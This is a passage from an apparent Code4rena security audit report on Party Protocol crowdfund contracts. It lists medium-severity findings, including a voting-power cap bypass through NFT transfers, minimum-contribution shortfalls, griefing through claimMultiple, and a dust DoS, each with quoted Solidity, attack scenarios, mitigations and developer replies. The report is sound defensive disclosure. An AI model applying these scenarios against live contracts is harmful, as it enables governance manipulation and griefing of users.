href=\"https://github.com/code-423n4/2023-04-party-findings/issues/21\">hansfriese</a></em></p>\n<p>ReraiseETHCrowdfund tries limit the voting power of each card by doing a min/maxContribution check in claim and claimMultiple.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint96 contribution = (votingPower * 1e4) / exchangeRateBps;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint96 maxContribution_ = maxContribution;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Check that the contribution equivalent of total pending voting</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // power is not above the max contribution range. This can happen</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // for contributors who contributed multiple times In this case, the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // `claimMultiple` function should be called instead. This is done</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // so parties may use the minimum and maximum contribution values to</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // limit the voting power of each card (e.g.  a party desiring a &quot;1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // card = 1 vote&quot;-like governance system where each card has equal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // voting power).</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (contribution &gt; maxContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                revert AboveMaximumContributionsError(contribution, maxContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L270-L282\">https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L270-L282</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Check that the contribution equivalent of voting power is within</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // contribution range. This is done so parties may use the minimum</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // and maximum contribution values to limit the voting power of each</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // card (e.g. a party desiring a &quot;1 card = 1 vote&quot;-like governance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // system where each card has equal voting power).</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (contribution &lt; minContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                revert BelowMinimumContributionsError(contribution, minContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (contribution &gt; maxContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                revert AboveMaximumContributionsError(contribution, maxContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L357-L369\">https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L357-L369</a></p>\n<p>However, this check can be bypassed due to the following code segment</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        else if (party.ownerOf(tokenId) == contributor) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Increase voting power of contributor&#39;s existing party card.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            party.addVotingPower(tokenId, votingPower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } </span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L295-L298\">https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L295-L298</a></p>\n<p>Consider the following situation. Suppose ReraiseETHCrowdfund sets maximumContribution to only allow at most 3 units of voting power in each card. Some user X can contribute the maximum amount twice as 2 different contributor addresses A &#x26; B (both of which he controls). When the crowdfund has finalized, X can first call claim as A, then transfer the partyGovernanceNFT from A to B (note that while the crowdfundNFT can’t be transferred, the partyGovernanceNFT can be transferred), and finally call claim as B to get a card with 6 units of voting power.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The degree of impact really depends on the use case of the party. Some parties would like each card to represent a single vote - this would obviously violate that. Generally, it’s not a great idea to allow a single card to hold a high amount of votes, so I’ll leave this as a medium for now.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>One solution is to restrict the maximum voting power on partyGovernanceNFT’s side. It can check the votingPower of each card before <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L169\">adding more votingPower</a> to it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/39#issuecomment-1512169729\">0xble (Party) commented</a>:</strong></p>\n<blockquote>\n<p>@evan - Couldn’t this also be mitigated by checking the voting power held by a card before adding voting power to it?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/39#issuecomment-1515508786\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Considering a refactor to only check <code>contribution > maxContribution</code> in <code>claim()</code> if <code>disableContributingForExistingCard</code> is true, which would mitigate this.</p>\n<p>The reasoning is the check was added for the case to support parties that wish to have a “1 card, 1 vote”-type governance system and must have fixed voting power per card. To do this we would expect <code>disableContributingForExistingCard</code> to be enabled. If it is not, the creator would be indicating it doesn’t matter.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/39#issuecomment-1532059790\">0xble (Party) commented</a>:</strong></p>\n<blockquote>\n<p>We’ve decided to refactor the way claiming works in the <code>ReraiseETHCrowdfund</code>, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.</p>\n<p>The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.</p>\n<p>This should mitigate this finding because the voting power transferred from crowdfund NFT to party card is known to be within the min/max contribution limit (otherwise the contribution that created the crowdfund NFT would have reverted) so there is no longer a min/max contribution check required when claiming.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-contributions-can-be-smaller-than-mincontribution-and-may-receive-no-voting-power\" style=\"position:relative;\"><a href=\"#m-03-contributions-can-be-smaller-than-mincontribution-and-may-receive-no-voting-power\" aria-label=\"m 03 contributions can be smaller than mincontribution and may receive no voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/37\">[M-03] Contributions can be smaller than <code>minContribution</code> and may receive no voting power</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/37\">0x52</a></em></p>\n<p>Valid contribution is awarded no voting power.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L195-L219\">ETHCrowdfundBase.sol#L195-L219</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint96 minContribution_ = minContribution;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (amount &lt; minContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert BelowMinimumContributionsError(amount, minContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint96 maxContribution_ = maxContribution;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (amount &gt; maxContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert AboveMaximumContributionsError(amount, maxContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint96 newTotalContributions = totalContributions + amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint96 maxTotalContributions_ = maxTotalContributions;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (newTotalContributions &gt;= maxTotalContributions_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        totalContributions = maxTotalContributions_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Finalize the crowdfund.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // This occurs before refunding excess contribution to act as a</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // reentrancy guard.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _finalize(maxTotalContributions_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Refund excess contribution.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint96 refundAmount = newTotalContributions - maxTotalContributions;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (refundAmount &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            amount -= refundAmount; &lt;- @audit-issue amount is reduced after min check</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            payable(msg.sender).transferEth(refundAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p>When processing a contribution, if the amount contributed would push the crowdfund over the max then it is reduced. This is problematic because this reduction occurs AFTER it checks the amount against the minimum contribution. The result is that these contributions can end up being less than the specified minimum.</p>\n<p>Although an edge case, if amount is smaller than exchangeRateBps as it could result in the user receiving no voting power at all for their contribution.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Enforce minContribution after reductions to amount.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/37#issuecomment-1515511086\">0xble (Party) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This was done intentionally.<code>minContribution</code> may be bypassed for the last contributor when the remaining contribution is less than the min otherwise the party may never be able to reach <code>maxTotalContributions</code>.</p>\n<blockquote>\n<p> “Although an edge case, if amount is smaller than exchangeRateBps as it could result in the user receiving no voting power at all for their contribution.”</p>\n</blockquote>\n<p>For this though we can add a check to ensure that <code>votingPower != 0</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/37#issuecomment-1526104629\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Thinking about this one more, it may be worth enforcing the min/max contribution checks after this happens to not allow for this case where <code>contribution &#x3C; minContribution</code>. The way it currently is creates a potentially bad scenario, as pointed out, where the last contributor may receive no voting power or not be able to claim their party card if this was a <code>ReraiseETHCrowdfund</code>.</p>\n<p>The motivation for allowing <code>minContribution</code> to be bypassed for the last contributor when the remaining contribution is less than <code>minContribution</code> was to allow parties to reach <code>maxTotalContributions</code> in a case where they otherwise wouldn’t be able to because the contribution to reach it would be below <code>minContribution</code>. However, in this scenario the crowdfund can still be won if either the crowdfund expires above <code>minTotalContribution</code> or a host finalizes at any point after <code>minTotalContribution</code> has been reached. So given the party has recourse if this were to happen, it makes more sense not to allow for this edge case where <code>contribution &#x3C; minContribution</code>.</p>\n<p>Will mitigate by enforcing <code>minContribution</code> after reductions to the contribution amount.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-reraiseethcrowdfundclaimmultiple-can-be-used-to-grief-large-depositors\" style=\"position:relative;\"><a href=\"#m-04-reraiseethcrowdfundclaimmultiple-can-be-used-to-grief-large-depositors\" aria-label=\"m 04 reraiseethcrowdfundclaimmultiple can be used to grief large depositors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/35\">[M-04] <code>ReraiseETHCrowdfund#claimMultiple</code> can be used to grief large depositors</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/35\">0x52</a></em></p>\n<p>User can be grieved by being force minted a large number of NFTs with low voting power instead of one with high voting power.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L354-L377\">ReraiseETHCrowdfund.sol#L354-L377</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i; i &lt; votingPowerByCard.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (votingPowerByCard[i] == 0) continue;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (contribution &lt; minContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert BelowMinimumContributionsError(contribution, minContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (contribution &gt; maxContribution_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert AboveMaximumContributionsError(contribution, maxContribution_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        votingPower -= votingPowerByCard[i];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Mint contributor a new party card.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Claimed(contributor, tokenId, votingPowerByCard[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><code>ReraiseETHCrowdfund#claimMultiple</code> can be called by any user for any other user. The above loop uses the user specified <code>votingPowerByCard</code> to assign each token a voting power and mint them to the contributor. This is problematic because large contributors can have their voting power fragmented into a large number of NFTs which a small amount of voting power each. The dramatically inflates the gas costs of the affected user.</p>\n<p><strong>Example:</strong><br>\n<code>minContribution = 1</code> and <code>maxContribution = 100</code>. User A contributes 100. This means they should qualify for one NFT of the largest size. However instead they can be minted 100 NFTs with 1 vote each.</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>If msg.sender isn’t contributor it should force the user to mint the minimum possible number of NFTs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 votingPower = pendingVotingPower[contributor];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (votingPower == 0) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+  if (msg.sender != contributor) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+      require(votingPowerByCard.length == (((votingPower - 1)/maxContribution) + 1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+  }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/35#issuecomment-1509846159\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Looking forward to sponsor comment on this one, I do see the potential issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/35#issuecomment-1511922104\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>To give more context, the reason we allow minting/claiming on another’s behalf is to allow others to potentially unblock governance if a user with delegated voting power does not come to claim, so it is an important feature to enable. It also works this way in prior releases of the protocol with past crowdfunds.</p>\n<p>This is a valid concern though and I like the recommended mitigation.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/35#issuecomment-1532057835\">0xble (Party) commented</a>:</strong></p>\n<blockquote>\n<p>We’ve decided to refactor the way claiming works in the <code>ReraiseETHCrowdfund</code>, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.</p>\n<p>The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.</p>\n<p>This should mitigate this finding because in this new system you cannot decide how to allocate another person’s voting power when claiming for them, there is only one choice which is to convert their crowdfund NFT into a party card of equivalent voting power.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-possible-dos-attack-using-dust-in-reraiseethcrowdfund_contribute\" style=\"position:relative;\"><a href=\"#m-05-possible-dos-attack-using-dust-in-reraiseethcrowdfund_contribute\" aria-label=\"m 05 possible dos attack using dust in reraiseethcrowdfund_contribute permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/18\">[M-05] Possible DOS attack using dust in <code>ReraiseETHCrowdfund._contribute()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/18\">hansfriese</a></em></p>\n<p>Normal contributors wouldn’t contribute to the crowdfund properly by a malicious frontrunner.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When users contribute to the <code>ReraiseETHCrowdfund</code>, it mints the crowdfund NFT in <code>_contribute()</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">04</span><span class=\"mtk1\">-</span><span class=\"mtk12\">party</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ReraiseETHCrowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_processContribution</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// OK to contribute with zero just to update delegate.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span 